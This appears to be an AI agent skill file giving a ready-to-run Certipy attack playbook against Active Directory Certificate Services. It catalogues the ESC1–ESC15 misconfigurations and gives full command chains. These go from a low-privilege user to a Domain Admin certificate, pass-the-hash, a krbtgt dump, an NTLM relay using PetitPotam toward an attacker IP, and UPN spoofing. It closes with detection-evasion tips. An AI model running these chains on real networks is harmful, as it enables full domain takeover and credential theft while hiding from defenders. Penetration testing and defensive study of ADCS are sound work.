---
name: ad-certipy-esc-chain
description: "ADCS abuse via Certipy — find vulnerable templates (ESC1-ESC15), request a certificate, authenticate as the target, dump the krbtgt. Full chain in 4 commands. Covers ESC1 (any SAN), ESC2 (any-purpose EKU), ESC3 (enrollment-agent), ESC4 (vulnerable ACL), ESC8 (NTLM relay to CA), ESC9/10/11/13."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "certipy adcs ad cs esc1 esc2 esc3 esc4 esc6 esc7 esc8 esc9 esc10 esc11 esc13 certificate template enrollment agent ntlm relay"
  subdomain: ad
  tags: ad, adcs, certificate, privilege-escalation
  mitre_attack: T1649, T1078.002
---

# ADCS Abuse via Certipy

`certipy` (Oliver Lyak / ly4k) is the single best tool for ADCS attack. Full domain compromise from a low-priv user in 4 commands, given a vulnerable template.

## 1. Find vulnerable templates

```bash
certipy find -u 'lowpriv@target.local' -p 'pass' -dc-ip <dc-ip> \
  -enabled -vulnerable -text -stdout

# Output: shows every ESC1-ESC15 finding with the affected template
# Look for: "ESC1", "ESC2", "ESC3" sections in the report
```

If you can't auth, use `-username '' -password ''` (anonymous LDAP — sometimes works) or use the local LDAP from a compromised machine.

## 2. The ESC catalog — quick reference

| ESC | Misconfiguration | Exploitation primitive |
|---|---|---|
| **ESC1** | Template allows SAN (Subject Alt Name) + Client Auth EKU + low-priv enrollee | Request cert as any user (`-upn administrator@target.local`) |
| **ESC2** | Template allows Any Purpose EKU | Same as ESC1, any role |
| **ESC3** | Template has Certificate Request Agent EKU + low-priv enrollee | Use the cert to request "on behalf of" another user |
| **ESC4** | Vulnerable ACL on template (WriteOwner/WriteDacl/GenericAll) | Modify template to make it ESC1, then exploit |
| **ESC5** | Vulnerable ACL on PKI objects (CA, OID containers) | Same — modify, then exploit |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on CA | Request ANY template with `-upn target` |
| **ESC7** | Low-priv has Manage CA / Manage Certificates | Approve own requests, issue certs to anyone |
| **ESC8** | HTTP-based enrollment endpoint exists | NTLM relay to `/certsrv/certfnsh.asp` (see ad-coercer) |
| **ESC9** | `msPKI-Enrollment-Flag` lacks STRONG_KEY_PROTECTION_REQUIRED and template has `UPN` mapping | Spoof UPN, get cert |
| **ESC10** | Weak certificate mapping (UPN-only, no SID extension) | Same as ESC9 but for kerberos PKINIT |
| **ESC11** | RPC binding without packet integrity | Relay over RPC instead of HTTP |
| **ESC13** | Template grants OID group membership (ADCS-managed groups) | Get cert → become member of high-priv group |
| **ESC14** | Specific weak ACE patterns on cert templates | Edit template, ESC1-chain |
| **ESC15** | `EKUwu` — EKU manipulation on V1 templates | Add Client Auth EKU to a template that lacked it |

## 3. Exploit ESC1 (the most common)

```bash
# Request a cert as Domain Administrator
certipy req -u 'lowpriv@target.local' -p 'pass' -dc-ip <dc-ip> \
  -ca 'TARGET-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@target.local' \
  -sid 'S-1-5-21-XXXX-500'

# Output: writes administrator.pfx — full DA cert.
```

## 4. Authenticate with the cert

```bash
# Convert to TGT
certipy auth -pfx administrator.pfx -username administrator -domain target.local -dc-ip <dc-ip>
# Output: NT hash + TGT

# Use the NT hash for pass-the-hash
impacket-psexec -hashes ':<NT_HASH>' target.local/administrator@dc.target.local
```

## 5. DCSync krbtgt (final step)

```bash
# Either with the cert-derived TGT:
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass dc.target.local
# Or with the NT hash:
impacket-secretsdump -hashes ':<NT_HASH>' target.local/administrator@dc.target.local
# Dumps krbtgt — full domain compromise; forge golden tickets at will.
```

## ESC8 chain (no vulnerable template, but ADCS Web Enrollment is enabled)

```bash
# Terminal 1: relay listener
sudo impacket-ntlmrelayx -t http://ca.target.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Terminal 2: coerce DC$
python3 PetitPotam.py <attacker_ip> <dc-ip>
# OR Coercer with anonymous auth

# Terminal 1 catches: GOT CERTIFICATE! Base64 PFX of DC$
# Decode, save as dc.pfx, then:
certipy auth -pfx dc.pfx -username 'dc$' -domain target.local -dc-ip <dc-ip>
# Dumps krbtgt next.
```

## ESC9/10 chain (UPN mapping abuse)

If you have GenericWrite on a user object (e.g., via low-priv-on-svc-account):

```bash
# 1. Change target user's UPN to a victim with no cert protection
certipy account update -u lowpriv@target.local -p pass \
  -user 'victim' -upn 'administrator@target.local'

# 2. Request a cert as victim (now resolves to admin)
certipy req -u lowpriv@target.local -p pass -ca TARGET-CA -template User \
  -dc-ip <dc-ip>

# 3. Revert UPN to avoid detection
certipy account update -u lowpriv -p pass -user victim -upn 'victim@target.local'

# 4. Auth with the cert — gives Administrator hash
certipy auth -pfx victim.pfx -domain target.local -dc-ip <dc-ip>
```

## OPSEC

- Microsoft Defender for Identity (MDI) flags ADCS abuse via specific event IDs (4886, 4887, 4768 with cert-based auth).
- Issuing cert to a high-priv account from a low-priv source is one of the most-watched detections.
- For evasion: use legitimate-looking template names; request via the most-common CA in the org; UPN-revert immediately (ESC9/10).
- `certipy auth` uses PKINIT — leaves a 4768 (TGT request) where `Certificate Information` field is populated. Distinctive.

## References

- "Certified Pre-Owned" — SpecterOps whitepaper (the original ESC1-ESC8 catalog)
- "Certipy 4.0" release notes (ly4k.github.io) — adds ESC9-ESC15
- ly4k/Certipy on GitHub — the canonical tool
- Microsoft KB articles on ADCS hardening (defender lens)
